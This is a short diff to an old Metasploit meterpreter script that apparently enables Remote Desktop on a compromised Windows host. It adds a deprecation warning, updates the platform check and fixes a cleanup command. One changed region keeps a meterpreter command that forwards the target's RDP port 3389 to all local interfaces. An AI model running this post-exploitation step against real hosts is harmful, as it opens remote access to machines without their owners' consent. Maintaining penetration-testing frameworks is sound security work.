@@ -1,3 +1,10 @@
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to improve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
@@ -144,7 +151,7 @@ frwrd = nil
   end
 
 }
-if client.platform =~ /win32|win64/
+if client.platform == 'windows'
   if args.length > 0
     if enbl or (usr and pass)
       message
@@ -169,7 +176,7 @@ if client.platform =~ /win32|win64/
         print_status("Starting the port forwarding at local port #{lport}")
         client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
       end
-      print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
+      print_status("For cleanup use command: run multi_console_command -r #{@dest}")
     else
       usage
     end
